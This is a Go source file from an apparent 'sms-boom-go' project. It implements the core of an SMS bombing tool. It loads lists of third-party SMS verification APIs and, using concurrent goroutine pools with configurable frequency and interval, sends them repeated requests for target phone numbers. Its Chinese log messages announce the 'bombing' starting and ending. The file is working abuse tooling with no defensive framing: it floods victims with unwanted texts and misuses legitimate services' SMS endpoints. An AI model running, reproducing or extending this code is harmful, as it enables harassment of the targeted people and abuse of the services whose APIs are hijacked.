package boom

import (
	"github.com/gookit/color"
	"github.com/panjf2000/ants/v2"
	"github.com/schollz/progressbar/v3"
	"log"
	"sms-boom-go/configs"
	"sms-boom-go/utils"
	"sync"
	"time"
)

var Progress *progressbar.ProgressBar
var ReqSum = 0
var ReqCount = 0
var ReqWg sync.WaitGroup

func Start(phone []string, frequency, interval, coroutineCount int) error {
	apis, err := loadApi()
	if err != nil {
		return err
	}
	color.Success.Printf("api.json 加载完成 接口数: %v\n", len(*apis))

	getApis, err := loadGetApi()
	if err != nil {
		return err
	}
	color.Success.Printf("getApi.json 加载完成 接口数: %v\n", len(*getApis))

	boom(apis, getApis, phone, frequency, interval, coroutineCount)

	return nil
}

func boom(apis *[]Api, getApis *[]string, phone []string, frequency, interval int, coroutineCount int) {
	color.Success.Print("\n轰炸开始！\n")

	ReqSum = (frequency * coroutineCount) * len(phone) * (len(*apis) + len(*getApis))
	Progress = progressbar.NewOptions64(
		int64(ReqSum),
		progressbar.OptionSetDescription("轰炸中"),
		progressbar.OptionSetWidth(25),
		progressbar.OptionShowCount(),
	)

	// 协程池
	defer ants.Release()
	apiPool, _ := ants.NewPoolWithFunc(configs.PoolRunTimes, func(i interface{}) {
		reqByAPI(i.(*Api), phone)
		_ = Progress.Add(1) // 进度条+1
		ReqCount++          // 请求次数+1
		ReqWg.Done()        // 协程池-1
	}, ants.WithPanicHandler(utils.PanicHandler))
	defer apiPool.Release()

	getApiPool, _ := ants.NewPoolWithFunc(configs.PoolRunTimes, func(i interface{}) {
		reqByGetAPI(i.(string), phone)
		_ = Progress.Add(1) // 进度条+1
		ReqCount++          // 请求次数+1
		ReqWg.Done()        // 协程池-1
	}, ants.WithPanicHandler(utils.PanicHandler))
	defer getApiPool.Release()

	// 处理
	for i := 0; i < frequency; i++ {
		var wg sync.WaitGroup
		for j := 0; j < coroutineCount; j++ {
			wg.Add(1)
			_ = ants.Submit(func() {
				for _, api := range *apis {
					ReqWg.Add(1)
					_ = apiPool.Invoke(&api)
				}

				for _, api := range *getApis {
					ReqWg.Add(1)
					_ = getApiPool.Invoke(api)
				}
				wg.Done()
			})
		}
		wg.Wait()

		if frequency > 1 {
			time.Sleep(time.Duration(interval) * time.Second)
		}
	}

	ReqWg.Wait()

	color.Success.Print("\n轰炸结束！\n")
}

func reqByAPI(api *Api, phone []string) {
	for _, ph := range phone {
		api.HandelApi(ph)
		resp, err := api.Send()
		if err != nil {
			log.Printf("API接口请求失败, 接口: %s, URL：%s, response: %s", api.Desc, api.Url, err)
		} else {
			body := []rune(string(resp.Body()))
			if len(body) >= 50 {
				body = body[:50]
			}
			log.Printf("API接口请求成功, 接口: %s, URL：%s, response: %s", api.Desc, resp.Request.URL, string(body))
		}
	}
}

func reqByGetAPI(api string, phone []string) {
	for _, ph := range phone {
		resp, err := SendByGetApi(api, ph)
		if err != nil {
			log.Printf("GetAPI接口请求失败，URL：%s, response: %s", api, err)
		} else {
			body := []rune(string(resp.Body()))
			if len(body) >= 50 {
				body = body[:50]
			}
			log.Printf("GetAPI接口请求成功，URL：%s, response: %s", resp.Request.URL, string(body))
		}
	}
}
